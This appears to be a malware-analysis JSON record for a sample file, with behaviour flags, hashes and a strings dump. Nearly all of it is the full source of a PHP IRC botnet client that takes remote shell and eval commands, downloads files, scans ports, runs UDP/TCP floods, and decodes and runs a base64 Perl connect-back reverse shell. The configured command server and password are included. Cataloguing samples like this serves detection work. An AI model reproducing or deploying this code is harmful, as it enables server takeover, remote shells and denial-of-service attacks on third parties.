{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Shell": "May run an executable file or a system command",
            "chr": "May attempt to obfuscate specific str",
            "command": "May run PowerShell commands",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "kill": "May delete a file",
            "open": "May open a file",
            "popen": "May run an executable file or a system command on a Mac",
            "shell": "May run an executable file or a system command",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "<?\n\n/*\n*\n* #ReloaD-X@corp. 2010\n* REcoding by: bogel\n* recky@doctor.com\n*\n* COMMANDS:\n*\n* .user <password> //login to the bot\n* .logout //logout of the bot\n* .die //kill the bot\n* .restart //restart the bot\n* .mail <to> <from> <subject> <msg> //send an email\n* .dns <IP|HOST> //dns lookup\n* .download <URL> <filename> //download a file\n* .exec <cmd> // uses exec() //execute a command\n* .sexec <cmd> // uses shell_exec() //execute a command\n* .cmd <cmd> // uses popen() //execute a command\n* .php <php code> // uses eval() //execute php code\n* .tcpflood <target> <packets> <packetsize> <port> <delay> //tcpflood attack\n* .udpflood <target> <packets> <packetsize> <delay> //udpflood attack\n* .raw <cmd> //raw IRC command\n* .rndnick //change nickname\n* .pscan <host> <port> //port scan\n* .safe // test safe_mode (dvl)\n* .inbox <to> // test inbox (dvl)\n* .conback <ip> <port> // conect back (dvl)\n* .uname // return shell's uname using a php function (dvl)\n*\n*/\n\nset_time_limit(0);\nerror_reporting(0);\necho \"ok!\";\n\nclass pBot\n{\nvar $config = array(\"server\"=>\"irc3.gibran.lu\",\n\"port\"=>\"6667\",\n\"pass\"=>\"\",\n\"prefix\"=>\"crot\",\n\"maxrand\"=>\"7\",\n\"chan\"=>\"#madura\",\n\"chan2\"=>\"#madura\",\n\"key\"=>\"none\",\n\"modes\"=>\"+ps\",\n\"password\"=>\"ayo\",\n\"trigger\"=>\".\",\n\"hostauth\"=>\"*\" // * for any hostname (remember: /setvhost pasukan.ddos.reload-x.info)\n);\nvar $users = array();\nfunction start()\n{\nif(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30)))\n$this->start();\n$ident = $this->config['prefix'];\n$alph = range(\"0\",\"9\");\nfor($i=0;$i<$this->config['maxrand'];$i++)\n$ident .= $alph[rand(0,9)];\nif(strlen($this->config['pass'])>0)\n$this->send(\"PASS \".$this->config['pass']);\n$this->send(\"USER \".$ident.\" 127.0.0.1 localhost :\".php_uname().\"\");\n$this->set_nick();\n$this->main();\n}\nfunction main()\n{\nwhile(!feof($this->conn))\n{\n$this->buf = trim(fgets($this->conn,512));\n$cmd = explode(\" \",$this->buf);\nif(substr($this->buf,0,6)==\"PING :\")\n{\n$this->send(\"PONG :\".substr($this->buf,6));\n}\nif(isset($cmd[1]) && $cmd[1] ==\"001\")\n{\n$this->send(\"MODE \".$this->nick.\" \".$this->config['modes']);\n$this->join($this->config['chan'],$this->config['key']);\nif (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\") { $safemode = \"on\"; }\nelse { $safemode = \"off\"; }\n$uname = php_uname();\n$this->privmsg($this->config['chan2'],\"[\\2uname!\\2]: $uname (safe: $safemode)\");\n\n}\nif(isset($cmd[1]) && $cmd[1]==\"433\")\n{\n$this->set_nick();\n}\nif($this->buf != $old_buf)\n{\n$mcmd = array();\n$msg = substr(strstr($this->buf,\" :\"),2);\n$msgcmd = explode(\" \",$msg);\n$nick = explode(\"!\",$cmd[0]);\n$vhost = explode(\"@\",$nick[1]);\n$vhost = $vhost[1];\n$nick = substr($nick[0],1);\n$host = $cmd[0];\nif($msgcmd[0]==$this->nick)\n{\nfor($i=0;$i<count($msgcmd);$i++)\n$mcmd[$i] = $msgcmd[$i+1];\n}\nelse\n{\nfor($i=0;$i<count($msgcmd);$i++)\n$mcmd[$i] = $msgcmd[$i];\n}\nif(count($cmd)>2)\n{\nswitch($cmd[1])\n{\ncase \"QUIT\":\nif($this->is_logged_in($host))\n{\n$this->log_out($host);\n}\nbreak;\ncase \"PART\":\nif($this->is_logged_in($host))\n{\n$this->log_out($host);\n}\nbreak;\ncase \"PRIVMSG\":\nif(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == \"*\"))\n{\nif(substr($mcmd[0],0,1)==\".\")\n{\nswitch(substr($mcmd[0],1))\n{\ncase \"user\":\nif($mcmd[1]==$this->config['password'])\n{\n$this->privmsg($this->config['chan'],\"[\\2Auth\\2]: OK $nick You Are Ready... My OwnER !!!\");\n$this->log_in($host);\n}\nelse\n{\n$this->privmsg($this->config['chan'],\"[\\2Auth\\2]: FUCK YOU..!! $nick !!!!\");\n}\nbreak;\n}\n}\n}\nelseif($this->is_logged_in($host))\n{\nif(substr($mcmd[0],0,1)==\".\")\n{\nswitch(substr($mcmd[0],1))\n{\ncase \"restart\":\n$this->send(\"QUIT :restart commando from $nick\");\nfclose($this->conn);\n$this->start();\nbreak;\ncase \"mail\": //mail to from subject message\nif(count($mcmd)>4)\n{\n$header = \"From: <\".$mcmd[2].\">\";\nif(!mail($mcmd[1],$mcmd[3],strstr($msg,$mcmd[4]),$header))\n{\n$this->privmsg($this->config['chan'],\"[\\2mail\\2]: Impossivel mandar e-mail.\");\n}\nelse\n{\n$this->privmsg($this->config['chan'],\"[\\2mail\\2]: Mensagem enviada para \\2\".$mcmd[1].\"\\2\");\n}\n}\nbreak;\ncase \"safe\":\nif (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\")\n{\n$safemode = \"on\";\n}\nelse {\n$safemode = \"off\";\n}\n$this->privmsg($this->config['chan'],\"[\\2safe mode\\2]: \".$safemode.\"\");\nbreak;\ncase \"inbox\": //teste inbox\nif(isset($mcmd[1]))\n{\n$token = md5(uniqid(rand(), true));\n$header = \"From: <inbox\".$token.\"@Guardi4n>\";\n$a = php_uname();\n$b = getenv(\"SERVER_SOFTWARE\");\n$c = gethostbyname($_SERVER[\"HTTP_HOST\"]);\nif(!mail($mcmd[1],\"InBox Test\",\"#pepek@yahoo.com. since 2003\\n\\nip: $c \\nsoftware: $b \\nsystem: $a \\nvuln: http://\".$_SERVER['SERVER_NAME'].\"\".$_SERVER['REQUEST_URI'].\"\\n\\ngreetz: wicked\\nby: dvl <jatim.community@gmail.com>\",$header))\n{\n$this->privmsg($this->config['chan'],\"[\\2inbox\\2]: Unable to send\");\n}\nelse\n{\n$this->privmsg($this->config['chan'],\"[\\2inbox\\2]: Message sent to \\2\".$mcmd[1].\"\\2\");\n}\n}\nbreak;\ncase \"conback\":\nif(count($mcmd)>2)\n{\n$this->conback($mcmd[1],$mcmd[2]);\n}\nbreak;\ncase \"dns\":\nif(isset($mcmd[1]))\n{\n$ip = explode(\".\",$mcmd[1]);\nif(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3]))\n{\n$this->privmsg($this->config['chan'],\"[\\2dns\\2]: \".$mcmd[1].\" => \".gethostbyaddr($mcmd[1]));\n}\nelse\n{\n$this->privmsg($this->config['chan'],\"[\\2dns\\2]: \".$mcmd[1].\" => \".gethostbyname($mcmd[1]));\n}\n}\nbreak;\ncase \"info\":\ncase \"vunl\":\nif (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\") { $safemode = \"on\"; }\nelse { $safemode = \"off\"; }\n$uname = php_uname();\n$this->privmsg($this->config['chan'],\"[\\2info\\2]: $uname (safe: $safemode)\");\n$this->privmsg($this->config['chan'],\"[\\2vuln\\2]: http://\".$_SERVER['SERVER_NAME'].\"\".$_SERVER['REQUEST_URI'].\"\");\nbreak;\ncase \"bot\":\n$this->privmsg($this->config['chan'],\"[\\2bot\\2]: phpbot 2.0 recording by jatimcom.\");\nbreak;\ncase \"uname\":\nif (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\") { $safemode = \"on\"; }\nelse { $safemode = \"off\"; }\n$uname = php_uname();\n$this->privmsg($this->config['chan'],\"[\\2info\\2]: $uname (safe: $safemode)\");\nbreak;\ncase \"rndnick\":\n$this->set_nick();\nbreak;\ncase \"raw\":\n$this->send(strstr($msg,$mcmd[1]));\nbreak;\ncase \"eval\":\n$eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1])));\nbreak;\ncase \"sexec\":\n$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);\n$exec = shell_exec($command);\n$ret = explode(\"\\n\",$exec);\nfor($i=0;$i<count($ret);$i++)\nif($ret[$i]!=NULL)\n$this->privmsg($this->config['chan'],\" : \".trim($ret[$i]));\nbreak;\n\ncase \"exec\":\n$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);\n$exec = exec($command);\n$ret = explode(\"\\n\",$exec);\nfor($i=0;$i<count($ret);$i++)\nif($ret[$i]!=NULL)\n$this->privmsg($this->config['chan'],\" : \".trim($ret[$i]));\nbreak;\n\ncase \"passthru\":\n$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);\n$exec = passthru($command);\n$ret = explode(\"\\n\",$exec);\nfor($i=0;$i<count($ret);$i++)\nif($ret[$i]!=NULL)\n$this->privmsg($this->config['chan'],\" : \".trim($ret[$i]));\nbreak;\n\ncase \"popen\":\nif(isset($mcmd[1]))\n{\n$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);\n$this->privmsg($this->config['chan'],\"[\\2popen\\2]: $command\");\n$pipe = popen($command,\"r\");\nwhile(!feof($pipe))\n{\n$pbuf = trim(fgets($pipe,512));\nif($pbuf != NULL)\n$this->privmsg($this->config['chan'],\" : $pbuf\");\n}\npclose($pipe);\n}\n\ncase \"system\":\n$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);\n$exec = system($command);\n$ret = explode(\"\\n\",$exec);\nfor($i=0;$i<count($ret);$i++)\nif($ret[$i]!=NULL)\n$this->privmsg($this->config['chan'],\" : \".trim($ret[$i]));\nbreak;\n\n\ncase \"pscan\": // .pscan 127.0.0.1 6667\nif(count($mcmd) > 2)\n{\nif(fsockopen($mcmd[1],$mcmd[2],$e,$s,15))\n$this->privmsg($this->config['chan'],\"[\\2pscan\\2]: \".$mcmd[1].\":\".$mcmd[2].\" is \\2open\\2\");\nelse\n$this->privmsg($this->config['chan'],\"[\\2pscan\\2]: \".$mcmd[1].\":\".$mcmd[2].\" is \\2closed\\2\");\n}\nbreak;\n\n\ncase \"download\":\nif(count($mcmd) > 2)\n{\nif(!$fp = fopen($mcmd[2],\"w\"))\n{\n$this->privmsg($this->config['chan'],\"[\\2download\\2]: Nao foi possivel fazer o download. Permissao negada.\");\n}\nelse\n{\nif(!$get = file($mcmd[1]))\n{\n$this->privmsg($this->config['chan'],\"[\\2download\\2]: Nao foi possivel fazer o download de \\2\".$mcmd[1].\"\\2\");\n}\nelse\n{\nfor($i=0;$i<=count($get);$i++)\n{\nfwrite($fp,$get[$i]);\n}\n$this->privmsg($this->config['chan'],\"[\\2download\\2]: Arquivo \\2\".$mcmd[1].\"\\2 baixado para \\2\".$mcmd[2].\"\\2\");\n}\nfclose($fp);\n}\n}\nelse { $this->privmsg($this->config['chan'],\"[\\2download\\2]: use .download http://your.host/file /tmp/file\"); }\nbreak;\ncase \"die\":\n$this->send(\"QUIT : $nick Pasukan-ddos-ReloaD-X\");\nfclose($this->conn);\nexit;\ncase \"logout\":\n$this->log_out($host);\n$this->privmsg($this->config['chan'],\"[\\2auth\\2]: $nick LoL !!\");\nbreak;\ncase \"udpflood\":\nif(count($mcmd)>3)\n{\n$this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]);\n}\nbreak;\ncase \"tcpflood\":\nif(count($mcmd)>5)\n{\n$this->tcpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4],$mcmd[5]);\n}\nbreak;\n}\n}\n}\nbreak;\n}\n}\n}\n$old_buf = $this->buf;\n}\n$this->start();\n}\nfunction send($msg)\n{\nfwrite($this->conn,\"$msg\\r\\n\");\n\n}\nfunction join($chan,$key=NULL)\n{\n$this->send(\"JOIN $chan $key\");\n}\nfunction privmsg($to,$msg)\n{\n$this->send(\"PRIVMSG $to :$msg\");\n}\nfunction notice($to,$msg)\n{\n$this->send(\"NOTICE $to :$msg\");\n}\nfunction is_logged_in($host)\n{\nif(isset($this->users[$host]))\nreturn 1;\nelse\nreturn 0;\n}\nfunction log_in($host)\n{\n$this->users[$host] = true;\n}\nfunction log_out($host)\n{\nunset($this->users[$host]);\n}\nfunction set_nick()\n{\nif(isset($_SERVER['SERVER_SOFTWARE']))\n{\nif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),\"apache\"))\n$this->nick = \"[A]\";\nelseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),\"iis\"))\n$this->nick = \"[B]\";\nelseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),\"xitami\"))\n$this->nick = \"[C]\";\nelse\n$this->nick = \"[D]\";\n}\nelse\n{\n$this->nick = \"[E]\";\n}\n$this->nick .= $this->config['prefix'];\nfor($i=0;$i<$this->config['maxrand'];$i++)\n$this->nick .= mt_rand(0,9);\n$this->send(\"NICK \".$this->nick);\n}\nfunction udpflood($host,$packetsize,$time) {\n$this->privmsg($this->config['chan'],\"[\\2UdpFlood Started!\\2]\");\n$packet = \"\";\nfor($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }\n$timei = time();\n$i = 0;\nwhile(time()-$timei < $time) {\n$fp=fsockopen(\"udp://\".$host,mt_rand(0,6000),$e,$s,5);\nfwrite($fp,$packet);\nfclose($fp);\n$i++;\n}\n$env = $i * $packetsize;\n$env = $env / 1048576;\n$vel = $env / $time;\n$vel = round($vel);\n$env = round($env);\n$this->privmsg($this->config['chan'],\"[\\2UdpFlood Finished!\\2]: $env MB enviados / Media: $vel MB/s \");\n}\nfunction tcpflood($host,$packets,$packetsize,$port,$delay)\n{\n$this->privmsg($this->config['chan'],\"[\\2TcpFlood Started!\\2]\");\n$packet = \"\";\nfor($i=0;$i<$packetsize;$i++)\n$packet .= chr(mt_rand(1,256));\nfor($i=0;$i<$packets;$i++)\n{\nif(!$fp=fsockopen(\"tcp://\".$host,$port,$e,$s,5))\n{\n$this->privmsg($this->config['chan'],\"[\\2TcpFlood\\2]: Error: <$e>\");\nreturn 0;\n}\nelse\n{\nfwrite($fp,$packet);\nfclose($fp);\n}\nsleep($delay);\n}\n$this->privmsg($this->config['chan'],\"[\\2TcpFlood Finished!\\2]: Config - $packets pacotes para $host:$port.\");\n}\nfunction conback($ip,$port)\n{\n$this->privmsg($this->config['chan'],\"[\\2conback\\2]: tentando conectando a $ip:$port\");\n$dc_source = \"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KcHJpbnQgIkRhdGEgQ2hhMHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQppZiAoISRBUkdWWzBdKSB7DQogIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogIGV4aXQoMSk7DQp9DQpwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KJGhvc3QgPSAkQVJHVlswXTsNCiRwb3J0ID0gODA7DQppZiAoJEFSR1ZbMV0pIHsNCiAgJHBvcnQgPSAkQVJHVlsxXTsNCn0NCnByaW50ICJbKl0gQ29ubmVjdGluZy4uLlxuIjsNCiRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3AnKSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0Kc29ja2V0KFNFUlZFUiwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCm15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KaWYgKCFjb25uZWN0KFNFUlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogIGRpZSgiVW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KfQ0KcHJpbnQgIlsqXSBTcGF3bmluZyBTaGVsbFxuIjsNCmlmICghZm9yayggKSkgew0KICBvcGVuKFNURElOLCI+JlNFUlZFUiIpOw0KICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgb3BlbihTVERFUlIsIj4mU0VSVkVSIik7DQogIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAuICJcMCIgeCA0Ow0KICBleGl0KDApOw0KfQ0KcHJpbnQgIlsqXSBEYXRhY2hlZFxuXG4iOw==\";\nif (is_writable(\"/tmp\"))\n{\nif (file_exists(\"/tmp/dc.pl\")) { unlink(\"/tmp/dc.pl\"); }\n$fp=fopen(\"/tmp/dc.pl\",\"w\");\nfwrite($fp,base64_decode($dc_source));\npassthru(\"perl /tmp/dc.pl $ip $port &\");\nunlink(\"/tmp/dc.pl\");\n}\nelse\n{\nif (is_writable(\"/var/tmp\"))\n{\nif (file_exists(\"/var/tmp/dc.pl\")) { unlink(\"/var/tmp/dc.pl\"); }\n$fp=fopen(\"/var/tmp/dc.pl\",\"w\");\nfwrite($fp,base64_decode($dc_source));\npassthru(\"perl /var/tmp/dc.pl $ip $port &\");\nunlink(\"/var/tmp/dc.pl\");\n}\nif (is_writable(\".\"))\n{\nif (file_exists(\"dc.pl\")) { unlink(\"dc.pl\"); }\n$fp=fopen(\"dc.pl\",\"w\");\nfwrite($fp,base64_decode($dc_source));\npassthru(\"perl dc.pl $ip $port &\");\nunlink(\"dc.pl\");\n}\n}\n}\n}\n\n$bot = new pBot;\n$bot->start();\n\n?> "
    },
    "filename": "VirusShare_41d58564f891bab081cf9535e73f4c36",
    "filesize": 13414,
    "filetype": "C source, ASCII text, with very long lines, with CRLF line terminators",
    "hashes": {
        "md5": "41d58564f891bab081cf9535e73f4c36",
        "sha1": "36d6f78031f8198ce374ded6031a7e6da15173ec",
        "sha256": "697773e003860a2153f564b725fa4b6d9eb3fa8a5c8528b746b37add95de0692"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "* #ReloaD-X@corp. 2010",
            "* REcoding by: bogel",
            "* recky@doctor.com",
            "* COMMANDS:",
            "* .user <password> //login to the bot",
            "* .logout //logout of the bot",
            "* .die //kill the bot",
            "* .restart //restart the bot",
            "* .mail <to> <from> <subject> <msg> //send an email",
            "* .dns <IP|HOST> //dns lookup",
            "* .download <URL> <filename> //download a file",
            "* .exec <cmd> // uses exec() //execute a command",
            "* .sexec <cmd> // uses shell_exec() //execute a command",
            "* .cmd <cmd> // uses popen() //execute a command",
            "* .php <php code> // uses eval() //execute php code",
            "* .tcpflood <target> <packets> <packetsize> <port> <delay> //tcpflood attack",
            "* .udpflood <target> <packets> <packetsize> <delay> //udpflood attack",
            "* .raw <cmd> //raw IRC command",
            "* .rndnick //change nickname",
            "* .pscan <host> <port> //port scan",
            "* .safe // test safe_mode (dvl)",
            "* .inbox <to> // test inbox (dvl)",
            "* .conback <ip> <port> // conect back (dvl)",
            "* .uname // return shell's uname using a php function (dvl)",
            "set_time_limit(0);",
            "error_reporting(0);",
            "echo \"ok!\";",
            "class pBot",
            "var $config = array(\"server\"=>\"irc3.gibran.lu\",",
            "\"port\"=>\"6667\",",
            "\"pass\"=>\"\",",
            "\"prefix\"=>\"crot\",",
            "\"maxrand\"=>\"7\",",
            "\"chan\"=>\"#madura\",",
            "\"chan2\"=>\"#madura\",",
            "\"key\"=>\"none\",",
            "\"modes\"=>\"+ps\",",
            "\"password\"=>\"ayo\",",
            "\"trigger\"=>\".\",",
            "\"hostauth\"=>\"*\" // * for any hostname (remember: /setvhost pasukan.ddos.reload-x.info)",
            "var $users = array();",
            "function start()",
            "if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30)))",
            "$this->start();",
            "$ident = $this->config['prefix'];",
            "$alph = range(\"0\",\"9\");",
            "for($i=0;$i<$this->config['maxrand'];$i++)",
            "$ident .= $alph[rand(0,9)];",
            "if(strlen($this->config['pass'])>0)",
            "$this->send(\"PASS \".$this->config['pass']);",
            "$this->send(\"USER \".$ident.\" 127.0.0.1 localhost :\".php_uname().\"\");",
            "$this->set_nick();",
            "$this->main();",
            "function main()",
            "while(!feof($this->conn))",
            "$this->buf = trim(fgets($this->conn,512));",
            "$cmd = explode(\" \",$this->buf);",
            "if(substr($this->buf,0,6)==\"PING :\")",
            "$this->send(\"PONG :\".substr($this->buf,6));",
            "if(isset($cmd[1]) && $cmd[1] ==\"001\")",
            "$this->send(\"MODE \".$this->nick.\" \".$this->config['modes']);",
            "$this->join($this->config['chan'],$this->config['key']);",
            "if (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\") { $safemode = \"on\"; }",
            "else { $safemode = \"off\"; }",
            "$uname = php_uname();",
            "$this->privmsg($this->config['chan2'],\"[\\2uname!\\2]: $uname (safe: $safemode)\");",
            "if(isset($cmd[1]) && $cmd[1]==\"433\")",
            "$this->set_nick();",
            "if($this->buf != $old_buf)",
            "$mcmd = array();",
            "$msg = substr(strstr($this->buf,\" :\"),2);",
            "$msgcmd = explode(\" \",$msg);",
            "$nick = explode(\"!\",$cmd[0]);",
            "$vhost = explode(\"@\",$nick[1]);",
            "$vhost = $vhost[1];",
            "$nick = substr($nick[0],1);",
            "$host = $cmd[0];",
            "if($msgcmd[0]==$this->nick)",
            "for($i=0;$i<count($msgcmd);$i++)",
            "$mcmd[$i] = $msgcmd[$i+1];",
            "else",
            "for($i=0;$i<count($msgcmd);$i++)",
            "$mcmd[$i] = $msgcmd[$i];",
            "if(count($cmd)>2)",
            "switch($cmd[1])",
            "case \"QUIT\":",
            "if($this->is_logged_in($host))",
            "$this->log_out($host);",
            "break;",
            "case \"PART\":",
            "if($this->is_logged_in($host))",
            "$this->log_out($host);",
            "break;",
            "case \"PRIVMSG\":",
            "if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == \"*\"))",
            "if(substr($mcmd[0],0,1)==\".\")",
            "switch(substr($mcmd[0],1))",
            "case \"user\":",
            "if($mcmd[1]==$this->config['password'])",
            "$this->privmsg($this->config['chan'],\"[\\2Auth\\2]: OK $nick You Are Ready... My OwnER !!!\");",
            "$this->log_in($host);",
            "else",
            "$this->privmsg($this->config['chan'],\"[\\2Auth\\2]: FUCK YOU..!! $nick !!!!\");",
            "break;",
            "elseif($this->is_logged_in($host))",
            "if(substr($mcmd[0],0,1)==\".\")",
            "switch(substr($mcmd[0],1))",
            "case \"restart\":",
            "$this->send(\"QUIT :restart commando from $nick\");",
            "fclose($this->conn);",
            "$this->start();",
            "break;",
            "case \"mail\": //mail to from subject message",
            "if(count($mcmd)>4)",
            "$header = \"From: <\".$mcmd[2].\">\";",
            "if(!mail($mcmd[1],$mcmd[3],strstr($msg,$mcmd[4]),$header))",
            "$this->privmsg($this->config['chan'],\"[\\2mail\\2]: Impossivel mandar e-mail.\");",
            "else",
            "$this->privmsg($this->config['chan'],\"[\\2mail\\2]: Mensagem enviada para \\2\".$mcmd[1].\"\\2\");",
            "break;",
            "case \"safe\":",
            "if (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\")",
            "$safemode = \"on\";",
            "else {",
            "$safemode = \"off\";",
            "$this->privmsg($this->config['chan'],\"[\\2safe mode\\2]: \".$safemode.\"\");",
            "break;",
            "case \"inbox\": //teste inbox",
            "if(isset($mcmd[1]))",
            "$token = md5(uniqid(rand(), true));",
            "$header = \"From: <inbox\".$token.\"@Guardi4n>\";",
            "$a = php_uname();",
            "$b = getenv(\"SERVER_SOFTWARE\");",
            "$c = gethostbyname($_SERVER[\"HTTP_HOST\"]);",
            "if(!mail($mcmd[1],\"InBox Test\",\"#pepek@yahoo.com. since 2003\\n\\nip: $c \\nsoftware: $b \\nsystem: $a \\nvuln: http://\".$_SERVER['SERVER_NAME'].\"\".$_SERVER['REQUEST_URI'].\"\\n\\ngreetz: wicked\\nby: dvl <jatim.community@gmail.com>\",$header))",
            "$this->privmsg($this->config['chan'],\"[\\2inbox\\2]: Unable to send\");",
            "else",
            "$this->privmsg($this->config['chan'],\"[\\2inbox\\2]: Message sent to \\2\".$mcmd[1].\"\\2\");",
            "break;",
            "case \"conback\":",
            "if(count($mcmd)>2)",
            "$this->conback($mcmd[1],$mcmd[2]);",
            "break;",
            "case \"dns\":",
            "if(isset($mcmd[1]))",
            "$ip = explode(\".\",$mcmd[1]);",
            "if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3]))",
            "$this->privmsg($this->config['chan'],\"[\\2dns\\2]: \".$mcmd[1].\" => \".gethostbyaddr($mcmd[1]));",
            "else",
            "$this->privmsg($this->config['chan'],\"[\\2dns\\2]: \".$mcmd[1].\" => \".gethostbyname($mcmd[1]));",
            "break;",
            "case \"info\":",
            "case \"vunl\":",
            "if (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\") { $safemode = \"on\"; }",
            "else { $safemode = \"off\"; }",
            "$uname = php_uname();",
            "$this->privmsg($this->config['chan'],\"[\\2info\\2]: $uname (safe: $safemode)\");",
            "$this->privmsg($this->config['chan'],\"[\\2vuln\\2]: http://\".$_SERVER['SERVER_NAME'].\"\".$_SERVER['REQUEST_URI'].\"\");",
            "break;",
            "case \"bot\":",
            "$this->privmsg($this->config['chan'],\"[\\2bot\\2]: phpbot 2.0 recording by jatimcom.\");",
            "break;",
            "case \"uname\":",
            "if (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\") { $safemode = \"on\"; }",
            "else { $safemode = \"off\"; }",
            "$uname = php_uname();",
            "$this->privmsg($this->config['chan'],\"[\\2info\\2]: $uname (safe: $safemode)\");",
            "break;",
            "case \"rndnick\":",
            "$this->set_nick();",
            "break;",
            "case \"raw\":",
            "$this->send(strstr($msg,$mcmd[1]));",
            "break;",
            "case \"eval\":",
            "$eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1])));",
            "break;",
            "case \"sexec\":",
            "$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);",
            "$exec = shell_exec($command);",
            "$ret = explode(\"\\n\",$exec);",
            "for($i=0;$i<count($ret);$i++)",
            "if($ret[$i]!=NULL)",
            "$this->privmsg($this->config['chan'],\" : \".trim($ret[$i]));",
            "break;",
            "case \"exec\":",
            "$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);",
            "$exec = exec($command);",
            "$ret = explode(\"\\n\",$exec);",
            "for($i=0;$i<count($ret);$i++)",
            "if($ret[$i]!=NULL)",
            "$this->privmsg($this->config['chan'],\" : \".trim($ret[$i]));",
            "break;",
            "case \"passthru\":",
            "$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);",
            "$exec = passthru($command);",
            "$ret = explode(\"\\n\",$exec);",
            "for($i=0;$i<count($ret);$i++)",
            "if($ret[$i]!=NULL)",
            "$this->privmsg($this->config['chan'],\" : \".trim($ret[$i]));",
            "break;",
            "case \"popen\":",
            "if(isset($mcmd[1]))",
            "$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);",
            "$this->privmsg($this->config['chan'],\"[\\2popen\\2]: $command\");",
            "$pipe = popen($command,\"r\");",
            "while(!feof($pipe))",
            "$pbuf = trim(fgets($pipe,512));",
            "if($pbuf != NULL)",
            "$this->privmsg($this->config['chan'],\" : $pbuf\");",
            "pclose($pipe);",
            "case \"system\":",
            "$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);",
            "$exec = system($command);",
            "$ret = explode(\"\\n\",$exec);",
            "for($i=0;$i<count($ret);$i++)",
            "if($ret[$i]!=NULL)",
            "$this->privmsg($this->config['chan'],\" : \".trim($ret[$i]));",
            "break;",
            "case \"pscan\": // .pscan 127.0.0.1 6667",
            "if(count($mcmd) > 2)",
            "if(fsockopen($mcmd[1],$mcmd[2],$e,$s,15))",
            "$this->privmsg($this->config['chan'],\"[\\2pscan\\2]: \".$mcmd[1].\":\".$mcmd[2].\" is \\2open\\2\");",
            "else",
            "$this->privmsg($this->config['chan'],\"[\\2pscan\\2]: \".$mcmd[1].\":\".$mcmd[2].\" is \\2closed\\2\");",
            "break;",
            "case \"download\":",
            "if(count($mcmd) > 2)",
            "if(!$fp = fopen($mcmd[2],\"w\"))",
            "$this->privmsg($this->config['chan'],\"[\\2download\\2]: Nao foi possivel fazer o download. Permissao negada.\");",
            "else",
            "if(!$get = file($mcmd[1]))",
            "$this->privmsg($this->config['chan'],\"[\\2download\\2]: Nao foi possivel fazer o download de \\2\".$mcmd[1].\"\\2\");",
            "else",
            "for($i=0;$i<=count($get);$i++)",
            "fwrite($fp,$get[$i]);",
            "$this->privmsg($this->config['chan'],\"[\\2download\\2]: Arquivo \\2\".$mcmd[1].\"\\2 baixado para \\2\".$mcmd[2].\"\\2\");",
            "fclose($fp);",
            "else { $this->privmsg($this->config['chan'],\"[\\2download\\2]: use .download http://your.host/file /tmp/file\"); }",
            "break;",
            "case \"die\":",
            "$this->send(\"QUIT : $nick Pasukan-ddos-ReloaD-X\");",
            "fclose($this->conn);",
            "exit;",
            "case \"logout\":",
            "$this->log_out($host);",
            "$this->privmsg($this->config['chan'],\"[\\2auth\\2]: $nick LoL !!\");",
            "break;",
            "case \"udpflood\":",
            "if(count($mcmd)>3)",
            "$this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]);",
            "break;",
            "case \"tcpflood\":",
            "if(count($mcmd)>5)",
            "$this->tcpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4],$mcmd[5]);",
            "break;",
